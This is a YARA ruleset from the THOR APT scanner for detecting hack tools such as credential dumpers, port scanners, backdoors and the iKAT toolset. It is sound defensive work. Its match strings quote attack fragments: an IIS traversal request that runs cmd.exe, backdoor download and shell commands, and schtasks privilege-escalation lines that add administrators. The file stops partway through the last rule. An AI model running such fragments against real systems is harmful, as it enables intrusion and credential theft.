/*

   THOR APT Scanner - Hack Tool Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner.

   We will frequently update this file with new rules rated TLP:WHITE

   Florian Roth
   Nextron Systems GmbH

   revision: 20170620

*/

import "pe"

/* WCE */

rule WindowsCredentialEditor
{
    meta:
       description = "Windows Credential Editor"
      threat_level = 10
      score = 90
       id = "1542c6e4-36b2-5272-85d0-43226869b43e"
    strings:
      $a = "extract the TGT session key"
      $b = "Windows Credentials Editor"
    condition:
       all of them
}

rule HKTL_Amplia_Security_Tool
{
    meta:
      description = "Detects Amplia Security Tool like Windows Credential Editor"
      score = 60
      nodeepdive = 1
      author = "Florian Roth"
      date = "2013-01-01"
      modified = "2023-02-14"
      id = "4ad83f34-561d-53ce-9766-e21700354da7"
    strings:
      $a = "Amplia Security"
      $c = "getlsasrvaddr.exe"
      $d = "Cannot get PID of LSASS.EXE"
      $e = "extract the TGT session key"
      $f = "PPWDUMP_DATA"
    condition:
      uint16(0) == 0x5a4d and
      filesize < 3000KB and (
         2 of them
      ) or 3 of them
}
/* pwdump/fgdump */

rule PwDump
{
   meta:
      description = "PwDump 6 variant"
      author = "Marc Stroebel"
      date = "2014-04-24"
      score = 70
      id = "e557e548-53e8-5098-93d4-8e899384e67c"
   strings:
      $s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
      $s6 = "Unable to query service status. Something is wrong, please manually check the st"
      $s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword
   condition:
      1 of them
}

rule PScan_Portscan_1 {
   meta:
      description = "PScan - Port Scanner"
      author = "F. Roth"
      score = 50
      id = "54997776-644b-5a72-b08c-7174b7dc7f66"
   strings:
      $a = "00050;0F0M0X0a0v0}0"
      $b = "vwgvwgvP76"
      $c = "Pr0PhOFyP"
   condition:
      all of them
}

rule HackTool_Samples {
   meta:
      description = "Hacktool"
      score = 50
      id = "ecacf84a-f66c-5c21-ae4b-fd9bfb5be384"
   strings:
      $a = "Unable to uninstall the fgexec service"
      $b = "Unable to set socket to sniff"
      $c = "Failed to load SAM functions"
      $d = "Dump system passwords"
      $e = "Error opening sam hive or not valid file"
      $f = "Couldn't find LSASS pid"
      $g = "samdump.dll"
      $h = "WPEPRO SEND PACKET"
      $i = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4"
      $j = "Usage: unshadow PASSWORD-FILE SHADOW-FILE"
      $k = "arpspoof\\Debug"
      $l = "Success: The log has been cleared"
      $m = "clearlogs [\\\\computername"
      $n = "DumpUsers 1."
      $o = "dictionary attack with specified dictionary file"
      $p = "by Objectif Securite"
      $q = "objectif-securite"
      $r = "Cannot query LSA Secret on remote host"
      $s = "Cannot write to process memory on remote host"
      $t = "Cannot start PWDumpX service on host"
      $u = "usage: %s <system hive> <security hive>"
      $v = "username:domainname:LMhash:NThash"
      $w = "<server_name_or_ip> | -f <server_list_file> [username] [password]"
      $x = "Impersonation Tokens Available"
      $y = "failed to parse pwdump format string"
      $z = "Dumping password"
   condition:
      1 of them
}

/* Disclosed hack tool set */

rule Fierce2
{
   meta:
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      description = "This signature detects the Fierce2 domain scanner"
      date = "01.07.2014"
      score = 60
      id = "08a72151-48c2-513b-995f-be0d5acba7dd"
   strings:
      $s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
   condition:
      1 of them
}

rule Ncrack
{
   meta:
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      description = "This signature detects the Ncrack brute force tool"
      date = "01.07.2014"
      score = 60
      id = "c1c56ee9-7f76-5440-b0e0-86e372c53340"
   strings:
      $s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
   condition:
      1 of them
}

rule SQLMap
{
   meta:
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      description = "This signature detects the SQLMap SQL injection tool"
      date = "01.07.2014"
      score = 60
      id = "55a72fe6-f82d-5d55-842f-5d7e1cfcc9fa"
   strings:
      $s1 = "except SqlmapBaseException, ex:"
   condition:
      1 of them
}

rule HKTL_PortScanner_Simple_Jan14 {
   meta:
      description = "Auto-generated rule on file PortScanner.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "b381b9212282c0c650cb4b0323436c63"
      old_rule_name = "PortScanner"
      id = "3e8960ce-0428-51e1-b992-4fa09fee8520"
   strings:
      $s0 = "Scan Ports Every"
      $s3 = "Scan All Possible Ports!"
   condition:
      all of them
}

rule DomainScanV1_0 {
   meta:
      description = "Auto-generated rule on file DomainScanV1_0.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
      id = "94ead827-8b29-5cb5-82b6-a7ca5087bf7e"
   strings:
      $s0 = "dIJMuX$aO-EV"
      $s1 = "XELUxP\"-\\"
      $s2 = "KaR\"U'}-M,."
      $s3 = "V.)\\ZDxpLSav"
      $s4 = "Decompress error"
      $s5 = "Can't load library"
      $s6 = "Can't load function"
      $s7 = "com0tl32:.d"
   condition:
      all of them
}

rule HKTL_MooreR_Port_Scanner {
   meta:
      description = "Auto-generated rule on file MooreR Port Scanner.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "376304acdd0b0251c8b19fea20bb6f5b"
      id = "5d8fb83f-bed3-53d2-bd33-2158911dc7c8"
   strings:
      $s0 = "Description|"
      $s3 = "soft Visual Studio\\VB9yp"
      $s4 = "adj_fptan?4"
      $s7 = "DOWS\\SyMem32\\/o"
   condition:
      all of them
}

rule NetBIOS_Name_Scanner {
   meta:
      description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "888ba1d391e14c0a9c829f5a1964ca2c"
      id = "03716e00-a969-5ab5-9be7-e8fc4272e40f"
   strings:
      $s0 = "IconEx"
      $s2 = "soft Visual Stu"
      $s4 = "NBTScanner!y&"
   condition:
      all of them
}

rule FeliksPack3___Scanners_ipscan {
   meta:
      description = "Auto-generated rule on file ipscan.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "6c1bcf0b1297689c8c4c12cc70996a75"
      id = "8360b268-3434-5142-9248-40b7a1589be9"
   strings:
      $s2 = "WCAP;}ECTED"
      $s4 = "NotSupported"
      $s6 = "SCAN.VERSION{_"
   condition:
      all of them
}

rule CGISscan_CGIScan {
   meta:
      description = "Auto-generated rule on file CGIScan.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "338820e4e8e7c943074d5a5bc832458a"
      id = "60bd5038-a308-55fd-85bb-2c4183f1c951"
   strings:
      $s1 = "Wang Products" fullword wide
      $s2 = "WSocketResolveHost: Cannot convert host address '%s'"
      $s3 = "tcp is the only protocol supported thru socks server"
   condition:
      all of ($s*)
}

rule IP_Stealing_Utilities {
   meta:
      description = "Auto-generated rule on file IP Stealing Utilities.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "65646e10fb15a2940a37c5ab9f59c7fc"
      id = "3a947e9c-d707-5819-88f2-059585750048"
   strings:
      $s0 = "DarkKnight"
      $s9 = "IPStealerUtilities"
   condition:
      all of them
}

rule SuperScan4 {
   meta:
      description = "Auto-generated rule on file SuperScan4.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "78f76428ede30e555044b83c47bc86f0"
      id = "bd353382-ffa2-56c5-b842-1ffc94d6849e"
   strings:
      $s2 = " td class=\"summO1\">"
      $s6 = "REM'EBAqRISE"
      $s7 = "CorExitProcess'msc#e"
   condition:
      all of them

}
rule PortRacer {
   meta:
      description = "Auto-generated rule on file PortRacer.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "2834a872a0a8da5b1be5db65dfdef388"
      id = "54717938-2f4c-5442-b0ad-40b9acd1101a"
   strings:
      $s0 = "Auto Scroll BOTH Text Boxes"
      $s4 = "Start/Stop Portscanning"
      $s6 = "Auto Save LogFile by pressing STOP"
   condition:
      all of them
}

rule scanarator {
   meta:
      description = "Auto-generated rule on file scanarator.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "848bd5a518e0b6c05bd29aceb8536c46"
      id = "dfc3ff29-03b4-58ca-bfe0-c6888fddab67"
   strings:
      $s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
   condition:
      all of them
}

rule aolipsniffer {
   meta:
      description = "Auto-generated rule on file aolipsniffer.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "51565754ea43d2d57b712d9f0a3e62b8"
      id = "f7cc0f31-6ba4-504b-82de-0334257b8a95"
   strings:
      $s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
      $s1 = "dwGetAddressForObject"
      $s2 = "Color Transfer Settings"
      $s3 = "FX Global Lighting Angle"
      $s4 = "Version compatibility info"
      $s5 = "New Windows Thumbnail"
      $s6 = "Layer ID Generator Base"
      $s7 = "Color Halftone Settings"
      $s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"
   condition:
      all of them
}

rule _Bitchin_Threads_ {
   meta:
      description = "Auto-generated rule on file =Bitchin Threads=.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
      id = "3a51e76c-b360-5f10-961c-ecc3ea3fa3c9"
   strings:
      $s0 = "DarKPaiN"
      $s1 = "=BITCHIN THREADS"
   condition:
      all of them
}

rule cgis4_cgis4 {
   meta:
      description = "Auto-generated rule on file cgis4.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "d658dad1cd759d7f7d67da010e47ca23"
      id = "98fbf445-b7a5-58fa-8f06-34be7321e2eb"
   strings:
      $s0 = ")PuMB_syJ"
      $s1 = "&,fARW>yR"
      $s2 = "m3hm3t_rullaz"
      $s3 = "7Projectc1"
      $s4 = "Ten-GGl\""
      $s5 = "/Moziqlxa"
   condition:
      all of them
}

rule portscan {
   meta:
      description = "Auto-generated rule on file portscan.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "a8bfdb2a925e89a281956b1e3bb32348"
      id = "967d6e3b-ae0d-5f93-a20d-742fc010608d"
   strings:
      $s5 = "0    :SCAN BEGUN ON PORT:"
      $s6 = "0    :PORTSCAN READY."
   condition:
      all of them
}

rule ProPort_zip_Folder_ProPort {
   meta:
      description = "Auto-generated rule on file ProPort.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "c1937a86939d4d12d10fc44b7ab9ab27"
      id = "cd611f6c-42ed-5cd3-a6ab-7e0970925e61"
   strings:
      $s0 = "Corrupt Data!"
      $s1 = "K4p~omkIz"
      $s2 = "DllTrojanScan"
      $s3 = "GetDllInfo"
      $s4 = "Compressed by Petite (c)1999 Ian Luck."
      $s5 = "GetFileCRC32"
      $s6 = "GetTrojanNumber"
      $s7 = "TFAKAbout"
   condition:
      all of them
}

rule StealthWasp_s_Basic_PortScanner_v1_2 {
   meta:
      description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "7c0f2cab134534cd35964fe4c6a1ff00"
      id = "7f706186-f2e2-5d4d-951a-2ec8fc757cec"
   strings:
      $s1 = "Basic PortScanner"
      $s6 = "Now scanning port:"
   condition:
      all of them
}

rule BluesPortScan {
   meta:
      description = "Auto-generated rule on file BluesPortScan.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "6292f5fc737511f91af5e35643fc9eef"
      id = "4bcb8b7c-5e22-5496-9a29-66e85e3c3395"
   strings:
      $s0 = "This program was made by Volker Voss"
      $s1 = "JiBOo~SSB"
   condition:
      all of them
}

rule scanarator_iis {
   meta:
      description = "Auto-generated rule on file iis.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
      id = "a467147b-53c8-53db-aa33-5f0e4e066988"
   strings:
      $s0 = "example: iis 10.10.10.10"
      $s1 = "send error"
   condition:
      all of them
}

rule stealth_Stealth {
   meta:
      description = "Auto-generated rule on file Stealth.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
      id = "5f45882e-3e27-596d-8725-fad380e1c297"
   strings:
      $s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
      $s6 = "This tool may be used only by system administrators. I am not responsible for "
   condition:
      all of them
}

rule Angry_IP_Scanner_v2_08_ipscan {
   meta:
      description = "Auto-generated rule on file ipscan.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "70cf2c09776a29c3e837cb79d291514a"
      id = "5fbcbb95-6cd4-5587-bf44-5b5ed133ce5e"
   strings:
      $s0 = "_H/EnumDisplay/"
      $s5 = "ECTED.MSVCRT0x"
      $s8 = "NotSupported7"
   condition:
      all of them
}

rule crack_Loader {
   meta:
      description = "Auto-generated rule on file Loader.exe"
      author = "yarGen Yara Rule Generator by Florian Roth"
      hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
      id = "0c4c7b69-7739-5c1b-8c7c-4aaa724e4455"
   strings:
      $s0 = "NeoWait.exe"
      $s1 = "RRRRRRRW"
   condition:
      all of them
}

rule CN_GUI_Scanner {
   meta:
      description = "Detects an unknown GUI scanner tool - CN background"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      hash = "3c67bbb1911cdaef5e675c56145e1112"
      score = 65
      date = "04.10.2014"
      id = "ca88d4d3-5d18-5856-874f-e50deceef54f"
   strings:
      $s1 = "good.txt" fullword ascii
      $s2 = "IP.txt" fullword ascii
      $s3 = "xiaoyuer" fullword ascii
      $s0w = "ssh(" wide
      $s1w = ").exe" fullword wide
   condition:
      all of them
}

rule CN_Packed_Scanner {
   meta:
      description = "Suspiciously packed executable"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      hash = "6323b51c116a77e3fba98f7bb7ff4ac6"
      score = 40
      date = "06.10.2014"
      id = "a11c4ee6-7244-5601-af26-a45f9fdc8e1b"
   strings:
      $s1 = "kernel32.dll" fullword ascii
      $s2 = "CRTDLL.DLL" fullword ascii
      $s3 = "__GetMainArgs" fullword ascii
      $s4 = "WS2_32.DLL" fullword ascii
   condition:
      all of them and filesize < 180KB and filesize > 70KB
}

rule Tiny_Network_Tool_Generic : FILE {
   meta:
      description = "Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "08.10.2014"
      score = 40
      hash0 = "9e1ab25a937f39ed8b031cd8cfbc4c07"
      hash1 = "cafc31d39c1e4721af3ba519759884b9"
      hash2 = "8e635b9a1e5aa5ef84bfa619bd2a1f92"
      id = "04b1c2c6-605c-52d5-aa07-f3b77a6c4593"
   strings:
      $s0 = "KERNEL32.DLL" fullword ascii
      $s1 = "CRTDLL.DLL" fullword ascii
      $s3 = "LoadLibraryA" fullword ascii
      $s4 = "GetProcAddress" fullword ascii

      $y1 = "WININET.DLL" fullword ascii
      $y2 = "atoi" fullword ascii

      $x1 = "ADVAPI32.DLL" fullword ascii
      $x2 = "USER32.DLL" fullword ascii
      $x3 = "wsock32.dll" fullword ascii
      $x4 = "FreeSid" fullword ascii
      $x5 = "atoi" fullword ascii

      $z1 = "ADVAPI32.DLL" fullword ascii
      $z2 = "USER32.DLL" fullword ascii
      $z3 = "FreeSid" fullword ascii
      $z4 = "ToAscii" fullword ascii

   condition:
      uint16(0) == 0x5a4d and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB
}

rule Beastdoor_Backdoor {
   meta:
      description = "Detects the backdoor Beastdoor"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 55
      hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
      id = "64f67233-6677-53c8-b212-f1a425f78803"
   strings:
      $s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
      $s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
      $s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
      $s7 = "Host: wwp.mirabilis.com:80" fullword
      $s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
      $s11 = "Shell                            -->Get A Shell" fullword
      $s14 = "DeleteService ServiceName        -->Delete A Service" fullword
      $s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
      $s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword
   condition:
      2 of them
}

rule Powershell_Netcat {
   meta:
      description = "Detects a Powershell version of the Netcat network hacking tool"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 60
      date = "10.10.2014"
      id = "e4b018c0-3214-5102-93b1-6a048324f9dd"
   strings:
      $s0 = "[ValidateRange(1, 65535)]" fullword
      $s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
      $s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword
   condition:
      all of them
}

rule Chinese_Hacktool_1014 {
   meta:
      description = "Detects a chinese hacktool with unknown use"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 60
      date = "10.10.2014"
      hash = "98c07a62f7f0842bcdbf941170f34990"
      id = "e5db5f58-a1fd-51e0-9037-337fcca71f11"
   strings:
      $s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
      $s1 = "msctls_progress32" fullword wide
      $s2 = "Reply-To: %s" fullword ascii
      $s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
      $s4 = "html htm htx asp" fullword ascii
   condition:
      all of them
}

rule CN_Hacktool_BAT_PortsOpen {
   meta:
      description = "Detects a chinese BAT hacktool for local port evaluation"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 60
      date = "12.10.2014"
      id = "55c3f678-ba70-5a4a-b288-9d0953eff968"
   strings:
      $s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
      $s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
      $s2 = "@echo off" ascii
   condition:
      all of them
}

rule CN_Hacktool_SSPort_Portscanner {
   meta:
      description = "Detects a chinese Portscanner named SSPort"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 70
      date = "12.10.2014"
      id = "38cc8830-efd3-51b7-8ac6-c9bf468212cb"
   strings:
      $s0 = "Golden Fox" fullword wide
      $s1 = "Syn Scan Port" fullword wide
      $s2 = "CZ88.NET" fullword wide
   condition:
      all of them
}

rule CN_Hacktool_ScanPort_Portscanner {
   meta:
      description = "Detects a chinese Portscanner named ScanPort"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 70
      date = "12.10.2014"
      id = "a708283e-339c-599f-9321-3b063d0076a9"
   strings:
      $s0 = "LScanPort" fullword wide
      $s1 = "LScanPort Microsoft" fullword wide
      $s2 = "www.yupsoft.com" fullword wide
   condition:
      all of them
}

rule CN_Hacktool_S_EXE_Portscanner {
   meta:
      description = "Detects a chinese Portscanner named s.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 70
      date = "12.10.2014"
      id = "d6b35d4f-7e25-50dd-bef2-08f7033312e8"
   strings:
      $s0 = "\\Result.txt" ascii
      $s1 = "By:ZT QQ:376789051" fullword ascii
      $s2 = "(http://www.eyuyan.com)" fullword wide
   condition:
      all of them
}

rule CN_Hacktool_MilkT_BAT {
   meta:
      description = "Detects a chinese Portscanner named MilkT - shipped BAT"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 70
      date = "12.10.2014"
      id = "d680a5f1-6182-5bc8-99de-c3cba1a61903"
   strings:
      $s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
      $s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii
   condition:
      all of them
}

rule CN_Hacktool_MilkT_Scanner {
   meta:
      description = "Detects a chinese Portscanner named MilkT"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 60
      date = "12.10.2014"
      id = "aa83c983-25c2-5051-88a1-fbc70d947d6e"
   strings:
      $s0 = "Bf **************" ascii fullword
      $s1 = "forming Time: %d/" ascii
      $s2 = "KERNEL32.DLL" ascii fullword
      $s3 = "CRTDLL.DLL" ascii fullword
      $s4 = "WS2_32.DLL" ascii fullword
      $s5 = "GetProcAddress" ascii fullword
      $s6 = "atoi" ascii fullword
   condition:
      all of them
}

rule CN_Hacktool_1433_Scanner {
   meta:
      description = "Detects a chinese MSSQL scanner"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 40
      date = "12.10.2014"
      id = "77712d29-1a32-59e7-999a-a2ef02212886"
   strings:
      $s0 = "1433" wide fullword
      $s1 = "1433V" wide
      $s2 = "del Weak1.txt" ascii fullword
      $s3 = "del Attack.txt" ascii fullword
      $s4 = "del /s /Q C:\\Windows\\system32\\doors\\" ascii
      $s5 = "!&start iexplore http://www.crsky.com/soft/4818.html)" fullword ascii
   condition:
      uint16(0) == 0x5a4d and all of ($s*)
}

rule CN_Hacktool_1433_Scanner_Comp2 {
   meta:
      description = "Detects a chinese MSSQL scanner - component 2"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      score = 40
      date = "12.10.2014"
      id = "7d707be5-dad0-5d91-965b-908a8603b6c0"
   strings:
      $s0 = "1433" wide fullword
      $s1 = "1433V" wide
      $s2 = "UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU" ascii fullword
   condition:
      uint16(0) == 0x5a4d and all of ($s*)
}

rule WCE_Modified_1_1014 {
   meta:
      description = "Modified (packed) version of Windows Credential Editor"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
      score = 70
      id = "536d1a7f-bda1-5c22-bf72-a177468e7c42"
   strings:
      $s0 = "LSASS.EXE" fullword ascii
      $s1 = "_CREDS" ascii
      $s9 = "Using WCE " ascii
   condition:
      all of them
}

rule ReactOS_cmd_valid {
   meta:
      description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
      score = 30
      hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
      id = "47df12b4-d202-5520-9c7f-9d0196bc2267"
   strings:
      $s1 = "ReactOS Command Processor" fullword wide
      $s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
      $s3 = "Eric Kohl and others" fullword wide
      $s4 = "ReactOS Operating System" fullword wide
   condition:
      all of ($s*)
}

rule iKAT_wmi_rundll {
   meta:
      description = "This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 65
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      hash = "97c4d4e6a644eed5aa12437805e39213e494d120"
      id = "e3d80c95-d333-53cf-8165-b3a1e66ed00d"
   strings:
      $s0 = "This operating system is not supported." fullword ascii
      $s1 = "Error!" fullword ascii
      $s2 = "Win32 only!" fullword ascii
      $s3 = "COMCTL32.dll" fullword ascii
      $s4 = "[LordPE]" ascii
      $s5 = "CRTDLL.dll" fullword ascii
      $s6 = "VBScript" fullword ascii
      $s7 = "CoUninitialize" fullword ascii
   condition:
      all of them and filesize < 15KB
}

rule iKAT_revelations {
   meta:
      description = "iKAT hack tool showing the content of password fields - file revelations.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 75
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
      id = "c5ef2c2a-c9c0-5c3a-bbcc-0b0949527850"
   strings:
      $s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
      $s8 = "BETAsupport@snadboy.com" fullword wide
      $s9 = "support@snadboy.com" fullword wide
      $s14 = "RevelationHelper.dll" fullword ascii
   condition:
      all of them
}

rule iKAT_priv_esc_tasksch {
   meta:
      description = "Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista."
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 75
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      hash = "84ab94bff7abf10ffe4446ff280f071f9702cf8b"
      id = "0786b313-3154-536b-b7eb-c4d8444a309f"
   strings:
      $s0 = "objShell.Run \"schtasks /change /TN wDw00t /disable\",,True" fullword ascii
      $s3 = "objShell.Run \"schtasks /run /TN wDw00t\",,True" fullword ascii
      $s4 = "'objShell.Run \"cmd /c copy C:\\windows\\system32\\tasks\\wDw00t .\",,True" fullword ascii
      $s6 = "a.WriteLine (\"schtasks /delete /f /TN wDw00t\")" fullword ascii
      $s7 = "a.WriteLine (\"net user /add ikat ikat\")" fullword ascii
      $s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii
      $s9 = "strFileName=\"C:\\windows\\system32\\tasks\\wDw00t\"" fullword ascii
      $s10 = "For n = 1 To (Len (hexXML) - 1) step 2" fullword ascii
      $s13 = "output.writeline \" Should work on Vista/Win7/2008 x86/x64\"" fullword ascii
      $s11 = "Set objExecObject = objShell.Exec(\"cmd /c schtasks /query /XML /TN wDw00t\")" fullword ascii
      $s12 = "objShell.Run \"schtasks /create /TN wDw00t /sc monthly /tr \"\"\"+biatchFile+\"" ascii
      $s14 = "a.WriteLine (\"net localgroup administrators /add v4l\")" fullword ascii
      $s20 = "Set ts = fso.createtextfile (\"wDw00t.xml\")" fullword ascii
   condition:
      2 of them
}

rule iKAT_command_lines_agent {
   meta:
      description = "iKAT hack tools set agent - file ikat.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 75
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
      id = "35068d59-272d-55a6-b211-2c138276914c"
   strings:
      $s0 = "Extended Module: super mario brothers" fullword ascii
      $s1 = "Extended Module: " fullword ascii
      $s3 = "ofpurenostalgicfeeling" fullword ascii
      $s8 = "-supermariobrotheretic" fullword ascii
      $s9 = "!http://132.147.96.202:80" fullword ascii
      $s12 = "iKAT Exe Template" fullword ascii
      $s15 = "withadancyflavour.." fullword ascii
      $s16 = "FastTracker v2.00   " fullword ascii
   condition:
      4 of them
}

rule iKAT_cmd_as_dll {
   meta:
      description = "iKAT toolset file cmd.dll ReactOS file cloaked"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 65
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
      id = "8d15b4b6-25f3-556c-bfa8-eba503c9c649"
   strings:
      $s1 = "cmd.exe" fullword wide
      $s2 = "ReactOS Development Team" fullword wide
      $s3 = "ReactOS Command Processor" fullword wide

      $ext = "extension: .dll" nocase
   condition:
      all of ($s*) and $ext
}

rule iKAT_tools_nmap {
   meta:
      description = "Generic rule for NMAP - based on NMAP 4 standalone"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 50
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
      id = "be4858e6-a8f3-55eb-9c04-f4def838dde1"
   strings:
